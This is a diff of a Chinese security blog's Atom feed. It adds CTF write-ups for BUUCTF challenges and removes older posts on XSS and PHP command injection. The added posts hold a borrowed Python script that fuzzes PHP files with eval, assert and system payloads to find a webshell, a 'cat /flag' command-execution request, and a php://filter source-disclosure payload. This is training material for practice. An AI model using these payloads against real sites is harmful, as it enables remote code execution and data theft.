@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-06-17T15:17:32.918Z</updated>
+  <updated>2020-06-18T14:36:32.619Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,52 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>强网杯2019-高明的黑客</title>
+    <link href="http://lingxin16.github.io/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
+    <id>http://lingxin16.github.io/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</id>
+    <published>2020-06-18T13:54:26.000Z</published>
+    <updated>2020-06-18T14:36:32.619Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt="1"></p><p>网站源码到<a href="http://www.tar.gz以供大家观赏，说明网站源码备份" target="_blank" rel="noopener">www.tar.gz以供大家观赏，说明网站源码备份</a></p><p>访问/<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>  得到一个压缩包</p><p>解压缩，得到3002个php文件，3002个……</p><p><img src="/2020/06/18/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/2.png" alt="2"></p><p>我这种菜狗，看到这种，头都要没了</p><p>还是看找师傅的wp吧</p><p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019%E5%BC%BA%E7%BD%91%E6%9D%AF#toc-heading-6" target="_blank" rel="noopener">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019%E5%BC%BA%E7%BD%91%E6%9D%AF#toc-heading-6</a></p><p>赵师傅的代码</p><pre><code class="Python">import osimport threadingfrom concurrent.futures.thread import ThreadPoolExecutorimport requestssession = requests.Session()path = &quot;/Users/jinzhao/PhpstormProjects/qwb/web2/&quot;  # 文件夹目录files = os.listdir(path)  # 得到文件夹下的所有文件名称mutex = threading.Lock()pool = ThreadPoolExecutor(max_workers=50)def read_file(file):    f = open(path + &quot;/&quot; + file);  # 打开文件    iter_f = iter(f);  # 创建迭代器    str = &quot;&quot;    for line in iter_f:  # 遍历文件，一行行遍历，读取文本        str = str + line    # 获取一个页面内所有参数    start = 0    params = {}    while str.find(&quot;$_GET[&#39;&quot;, start) != -1:        pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_GET[&#39;&quot;, start) + 1)        var = str[str.find(&quot;$_GET[&#39;&quot;, start) + 7: pos2]        start = pos2 + 1        params[var] = &#39;echo(&quot;glzjin&quot;);&#39;        # print(var)    start = 0    data = {}    while str.find(&quot;$_POST[&#39;&quot;, start) != -1:        pos2 = str.find(&quot;&#39;]&quot;, str.find(&quot;$_POST[&#39;&quot;, start) + 1)        var = str[str.find(&quot;$_POST[&#39;&quot;, start) + 8: pos2]        start = pos2 + 1        data[var] = &#39;echo(&quot;glzjin&quot;);&#39;        # print(var)    # eval test    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # assert test    for i in params:        params[i] = params[i][:-1]    for i in data:        data[i] = data[i][:-1]    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # system test    for i in params:        params[i] = &#39;echo glzjin&#39;    for i in data:        data[i] = &#39;echo glzjin&#39;    r = session.post(&#39;http://localhost:11180/web2/&#39; + file, data=data, params=params)    if r.text.find(&#39;glzjin&#39;) != -1:        mutex.acquire()        print(file + &quot; found!&quot;)        mutex.release()    # print(&quot;====================&quot;)for file in files:  # 遍历文件夹    if not os.path.isdir(file):  # 判断是否是文件夹，不是文件夹才打开        # read_file(file)        pool.submit(read_file, file)</code></pre><p>访问 /xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</p><p>得到flag</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ACTF2020新生赛-Include</title>
+    <link href="http://lingxin16.github.io/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/"/>
+    <id>http://lingxin16.github.io/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/</id>
+    <published>2020-06-18T13:42:07.000Z</published>
+    <updated>2020-06-18T13:53:11.037Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/1.png" alt="1"></p><p>tips指向?file=flag.php</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/2.png" alt="2"></p><p>访问?file=php://filter/read/convert.base64-encode/resource=flag.php</p><p>得到flag.php的base64加密后的内容</p><p><img src="/2020/06/18/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/3.png" alt="3"></p><p>然后base64解码得flag</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>GXYCTF2019-PingPingPing</title>
@@ -404,48 +450,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;CSRF漏洞&quot;&gt;&lt;a href=&quot;#CSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞&quot;&gt;&lt;/a&gt;CSRF漏洞&lt;/h2&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day7</title>
-    <link href="http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/"/>
-    <id>http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/</id>
-    <published>2020-03-23T13:23:41.000Z</published>
-    <updated>2020-03-23T14:08:59.772Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><a id="more"></a><p>跨站脚本攻击( Cross Site Scripting )是指攻击者利用网站程序对用户输入过滤不足,输入可以显示在页面上对其他用户造成影响的HTML代码,从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表( Cascading Style Sheets )的缩写CSS区分开,跨站脚本攻击通常简写为XSS。</p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>搜索内容</p><p>发表文章</p><p>评论回复</p><p>资料设置</p><p>留言</p><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><p>反射型</p><p>存储型</p><p>DOM型</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>​    非持久型,也叫反射型XSS。通过GET和POST方法,向服务器端输入数据。用户输入的数据通常被放置在URL的query string中,或者是form数据中。如果服务器端对输入的数据不进行过滤,验证或编码,就直接将用户输入的信息直接呈现给客户，则可能会造成反射型XSS。</p><p>​    反射型XSS是比较普遍的XSS ,其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重,如在输入框的name中输入<meta http-equiv="refresh" content="5"> ,服务器不加处理,将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。</p><p>常见场景:<br>●将前端获取的内容,直接输出到浏览器页面<br>●将前端获取的内容,直接输出到HTML标签<br>●将前端获取的内容，直接输出到<script>标签</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>​    持久型,也叫存储型XSS,通常是因为服务器端将用户输入的恶意脚本没有通过验证就直接存储在数据库,并且每次通过调用数据库的方式,将数据呈现在浏览器上。则该XSS跨站脚本攻击将一直存在。若其他用户访问该页面,则恶意脚本就会被触发,用于盗取其他用户的私人信息。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>​    DOM ,全称Document Object Model ,是一个平台和语言都中立的接口,可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>DOM型XSS其实是一种特殊类型的XSS ,它是基于DOM文档对象模型的一种漏洞。</p></script></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;XSS漏洞&quot;&gt;&lt;a href=&quot;#XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;XSS漏洞&quot;&gt;&lt;/a&gt;XSS漏洞&lt;/h2&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day6</title>
-    <link href="http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/"/>
-    <id>http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/</id>
-    <published>2020-03-22T13:40:26.000Z</published>
-    <updated>2020-03-22T14:19:42.208Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><a id="more"></a><p>命令注入是一种攻击，目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单、cookie、HTTP头等）传递给系统shell时，命令注入攻击是可能的。在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的特权执行。命令注入攻击可能很大程度上是由于输入验证不足。</p><h3 id="命令执行和代码执行的区别"><a href="#命令执行和代码执行的区别" class="headerlink" title="命令执行和代码执行的区别"></a>命令执行和代码执行的区别</h3><p>代码执行：执行的效果完全受限于语言本身</p><p>命令执行：执行的效果不受限于语言语法本身，不受命令本身限制</p><h3 id="命令执行类型："><a href="#命令执行类型：" class="headerlink" title="命令执行类型："></a>命令执行类型：</h3><blockquote><p>1.代码层过滤不严</p><p>2.系统漏洞</p><p>3.第三方组件存在代码执行漏洞</p></blockquote><p>常见函数：</p><p>system函数<br>passthru函数<br>Exec函数<br>Shell_exec函数<br>“</p><p>1.system函数</p><p>string system( string $command[,int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，则外部命令执行后的返回状态将会被设置到此变量中</p><p>2.passthru函数</p><p>string passthru ( string $command [, int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，Unix命令的返回状态会被记录到此参数</p><p>3.Exec函数</p><p>string exec ( string $command [,  array &amp;$output [, int &amp;$return var ]] )</p><p>$command 要执行的命令</p><p>$output 如果提供此参数，会有命令执行的输出填充此数组</p><p>$return_ var如果同时提供$output和$return_var参数，命令执行后的返回状态会被写入到此变量</p><p>4.Shell_exec函数</p><p>string shell_exec ( string $cmd )</p><p>$cmd 要执行的命令</p><p>反引号(`)则调用此函数</p><p>5.过滤函数</p><p>Escapeshellcmd() 过滤整条命令</p><p>Escapeshellarg() 过滤整个参数</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;命令执行漏洞&quot;&gt;&lt;a href=&quot;#命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;命令执行漏洞&quot;&gt;&lt;/a&gt;命令执行漏洞&lt;/h2&gt;
     
     </summary>
     
